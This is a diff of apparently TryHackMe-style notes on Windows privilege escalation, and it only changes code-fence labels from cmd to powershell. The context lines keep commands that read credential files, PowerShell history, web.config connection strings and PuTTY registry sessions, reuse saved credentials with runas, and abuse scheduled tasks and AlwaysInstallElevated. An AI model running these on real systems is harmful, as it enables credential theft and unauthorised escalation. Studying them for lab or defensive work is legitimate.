@@ -110,7 +110,7 @@ https://github.com/PwnDexter/SharpEDRChecker
 ```
 # Abusing Service Misconfigurations ✅
 ## Windows-Applications/Services-Enumeration ✅
-```cmd
+```powershell
 net start # List of active services in the system
 wmic service where "name like 'THM Demo'" get Name,PathName #  Find the path of the specific service executable file
 Get-Process -Name thm-demo # Checking Process activities associated with this service
@@ -170,7 +170,7 @@ reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsScheduler 
 
 # Credentials ✅
 ## File-Unattended ✅
-```cmd
+```powershell
 C:\Unattend.xml
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattend\Unattend.xml
@@ -197,7 +197,7 @@ Get-ChildItem -Hidden -Path C:\Users -Recurse -Force | Select-String -Pattern "p
 ```
 ## Powershell History ✅
 ### cmd ✡️
-```cmd
+```powershell
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in cmd
 type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt # run in powershell
 ```
@@ -208,18 +208,18 @@ runas /savecred /user:<username> cmd.exe # run cmd with another user
 runas /savecred /user:<username> powershell.exe # run powershell with another user
 ```
 ## IIS Configuration ✅
-```cmd
+```powershell
 type C:\inetpub\wwwroot\web.config | findstr connectionString
 forfiles /p C:\ /s /m web.config /c "cmd /c findstr /i connectionString @file" 2>$null
 type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 ## Retrieve Credentials from Software: PuTTY ✅
-```cmd
+```powershell
 reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
 
 ## Scheduled Tasks ✅
-```cmd
+```powershell
 1️⃣ # Check and find vuln task on target system
 schtasks # List recipe all scheduled tasks
 schtasks /query /fo LIST /v # list of all the scheduled tasks in the system, along with the full details of each task
@@ -240,7 +240,7 @@ schtasks /run /tn vulntask
 
 When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.
 
-```cmd
+```powershell
 # If the value of Alwaysinstallelelevated in both keys is 1, the system is vulnerable.
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 
